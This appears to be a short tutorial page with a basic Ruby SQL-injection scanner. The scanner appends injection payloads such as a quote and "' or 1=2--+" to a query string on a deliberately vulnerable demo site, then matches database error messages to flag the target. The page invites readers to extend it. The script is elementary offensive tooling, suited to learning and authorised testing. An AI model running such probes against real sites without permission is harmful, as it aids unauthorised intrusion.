# SQL Injection Scanner

Here a very basic and simple SQL-injection solid scanner, develop it as far as you can!

```ruby
#!/usr/bin/env ruby
#
# Very basic SQLi scanner!
#
require 'net/http'

# Some SQLi payloads
payloads =
    [
      '\'',
      '"',
      '\' or 1=2--+'
    ]

# Some database error responses
errors =
    {
      :mysql => [
                 "SQL.*syntax",
                 "mysql.*(fetch).*array",
                 "Warning"
                ],
      :mssql => [
                 "line.*[0-9]",
                 "Microsoft SQL Native Client error.*"
                ],
      :oracle => [
                  ".*ORA-[0-9].*",
                  "Warning"
                 ]
      }

# Try a known vulnerable site
uri  = URI.parse "http://testphp.vulnweb.com/artists.php?artist=1"

# Update the query with a payload
uri.query += payloads[0]

# Send get request
response = Net::HTTP.get uri

# Search if an error occured = vulnerable
puts "[+] The #{uri.to_s} is vulnerable!" unless response.match(/#{errors[:mysql][0]}/i).nil?

```

Try this url (http://testasp.vulnweb.com/showforum.asp?id=0)

